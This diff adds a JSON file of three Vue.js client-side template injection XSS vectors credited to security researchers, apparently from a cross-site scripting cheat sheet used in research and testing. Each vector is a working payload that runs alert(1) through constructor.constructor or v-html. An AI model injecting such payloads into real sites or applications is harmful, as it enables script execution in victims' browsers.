@@ -1,0 +1,45 @@
+[
+    {
+        "authors": [
+            {
+                "name": "Mario Heiderich",
+                "company": "Cure53",
+                "twitterUrl": "https:\/\/twitter.com\/cure53berlin"
+            }
+        ],
+        "vector": "{{constructor.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false
+    },
+    {
+        "authors": [
+            {
+                "name": "Mario Heiderich",
+                "company": "Cure53",
+                "twitterUrl": "https:\/\/twitter.com\/cure53berlin"
+            },
+            {
+                "name": "Script Gadget Research",
+                "company": "Google"
+            }
+        ],
+        "vector": "<div v-html=\"''.constructor.constructor('alert(1)')()\">a</div>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            }
+        ],
+        "vector": "<x v-html=_c.constructor('alert(1)')()>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false
+    }
+]
